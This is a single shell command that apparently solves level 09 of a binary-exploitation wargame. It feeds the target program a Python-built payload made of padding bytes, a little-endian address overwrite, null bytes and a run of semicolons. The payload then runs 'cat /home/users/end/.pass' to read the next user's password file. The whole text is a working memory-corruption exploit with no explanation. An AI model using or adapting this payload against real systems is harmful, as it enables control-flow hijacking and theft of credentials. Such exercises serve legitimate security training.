./level09 < <(python -c 'import sys; sys.stdout.write("\xff" * 128 + "o" * 140 + "\xff" * 59 + "\x8c\x48\x55\x55\x55\x55" + 
"\x00" * 70 + 747 * ";" + "cat /home/users/end/.pass")')